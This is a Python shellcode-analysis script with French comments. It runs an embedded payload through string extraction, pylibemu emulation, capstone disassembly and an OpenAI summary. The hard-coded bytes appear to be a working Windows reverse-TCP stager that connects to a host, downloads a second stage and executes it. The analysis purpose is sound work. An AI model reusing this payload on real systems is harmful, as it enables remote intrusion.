import pylibemu
import openai
import os
import re
from capstone import Cs, CS_ARCH_X86, CS_MODE_32
from dotenv import load_dotenv

# variable .env (clé openai)
load_dotenv()
openai.api_key = os.getenv("OPENAI_API_KEY")

# shellcode hard
shellcode = (
    b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x31\xff\x8b"
    b"\x72\x28\x0f\xb7\x4a\x26\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52"
    b"\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50\x8b\x58"
    b"\x20\x01\xd3\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38"
    b"\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
    b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12"
    b"\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8"
    b"\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x0a\x0a\x0a"
    b"\x0a\x68\x02\x00\x34\x19\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
    b"\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
    b"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
    b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
    b"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
    b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff"
    b"\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5"
)


# les chaînes lisibles du shellcode
def get_shellcode_strings(shellcode):
    return [s.decode("utf-8", errors="ignore") for s in re.findall(rb"[\x20-\x7e]{4,}", shellcode)]


# test avec pylibemu
def get_pylibemu_analysis(shellcode):
    emu = pylibemu.Emulator()
    offset = emu.shellcode_getpc_test(shellcode)
    if offset < 0:
        offset = 0
    emu.prepare(shellcode, offset)
    emu.test()
    return emu.emu_profile_output.decode(errors="ignore")


# désassemblage avec capstone pour voir les instructions asm
def get_capstone_analysis(shellcode):
    disas = Cs(CS_ARCH_X86, CS_MODE_32)
    result = []
    for i in disas.disasm(shellcode, 0x1000):
        result.append(f"{i.address:08x}:\t{i.mnemonic}\t{i.op_str}")
    return "\n".join(result)


# analyse avec chatgpt4.1 nano
def get_llm_analysis(profile):
    try:
        rep = openai.ChatCompletion.create(
            model="gpt-4.1-nano-2025-04-14",
            messages=[
                {
                    "role": "system",
                    "content": "Tu es un expert en cybersécurité. Analyse ce shellcode brièvement en 2-3 paragraphes.",
                },
                {"role": "user", "content": profile},
            ],
            temperature=0.3,
        )
        return rep["choices"][0]["message"]["content"]
    except Exception as e:
        return f"Erreur avec GPT : {e}"


# affichage
print("\n>> chaînes trouvées dans le shellcode :\n")
for s in get_shellcode_strings(shellcode):
    print("-", s)

print("\n>> pylibemu :\n")
p = get_pylibemu_analysis(shellcode)
print(p)

if len(p.strip().splitlines()) <= 4:
    print(
        "[!] Note : L'analyse Pylibemu est très courte. Le shellcode est probablement obfusqué ou trop complexe pour être retranscrit."
    )

print("\n>> désassemblage capstone :\n")
print(get_capstone_analysis(shellcode))

print("\n>> chatgpt4.1 :\n")
print(get_llm_analysis(p))
